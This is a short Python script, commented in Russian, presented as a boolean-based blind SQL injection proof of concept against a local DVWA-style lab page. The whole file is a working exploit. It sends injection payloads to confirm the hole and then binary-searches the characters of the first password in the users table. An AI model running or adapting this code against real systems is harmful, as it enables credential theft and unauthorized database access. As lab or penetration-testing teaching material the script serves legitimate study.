#!/usr/bin/env python3
"""
Blind SQL Injection – Proof of Concept (Boolean-based)
Использует бинарный поиск для извлечения первого символа пароля администратора.
Только для образовательных целей и авторизованного тестирования.
"""
import requests

TARGET_URL = "http://localhost:8080/vulnerabilities/sqli_blind/?id=1"
TRUE_CONDITION = "1' AND 1=1-- "
FALSE_CONDITION = "1' AND 1=2-- "
# true / false
SUCCESS_MARKER = "User ID exists"
CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

def is_true(payload: str) -> bool:
    """Возвращает True, если ответ содержит маркер успеха."""
    url = TARGET_URL.replace("id=1", f"id={requests.utils.quote(payload)}")
    try:
        r = requests.get(url, timeout=10)
        return SUCCESS_MARKER in r.text
    except:
        return False

def get_char_at(position: int) -> str:
    """Бинарный поиск символа на заданной позиции."""
    low, high = 32, 126
    while low <= high:
        mid = (low + high) // 2
        payload = f"1' AND SUBSTRING((SELECT password FROM users LIMIT 1),{position},1) >= CHAR({mid})-- "
        if is_true(payload):
            low = mid + 1
        else:
            high = mid - 1
    return chr(high)

def main():
    print("[*] Запуск PoC Blind SQL Injection")
    if is_true(TRUE_CONDITION) and not is_true(FALSE_CONDITION):
        print("[+] Уязвимость подтверждена")
    else:
        print("[-] Уязвимость не обнаружена"); return

    print("[*] Извлекаю первый символ пароля администратора...")
    first_char = get_char_at(1)
    print(f"[!] Первый символ пароля: '{first_char}'")
    # demo
    for pos in range(1, 4):
        print(f"  Символ {pos}: '{get_char_at(pos)}'")

if __name__ == "__main__":
    main()
